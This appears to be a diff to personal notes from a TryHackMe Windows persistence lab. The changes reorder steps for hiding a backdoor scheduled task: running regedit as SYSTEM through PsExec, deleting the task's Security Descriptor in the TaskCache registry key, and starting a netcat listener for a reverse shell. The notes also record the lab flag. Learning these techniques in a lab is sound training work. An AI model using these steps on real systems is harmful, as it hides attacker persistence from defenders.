@@ -170,12 +170,14 @@ schtasks /query /tn thm-taskbackdoor
 -mask task inivisible
 -Security Descriptor: ties scheduled tasks to users
 c:\tools\pstools\PsExec64.exe -s -i regedit
+-open regedit go to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+-delete SD for the task
 -try query again should return an error 
 -start listener on attack machine
 nc -lvp [AttackPort]
 -grab flag
 *THM{JUST_A_MATTER_OF_TIME}
--open regedit go to: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
+
 
 
 
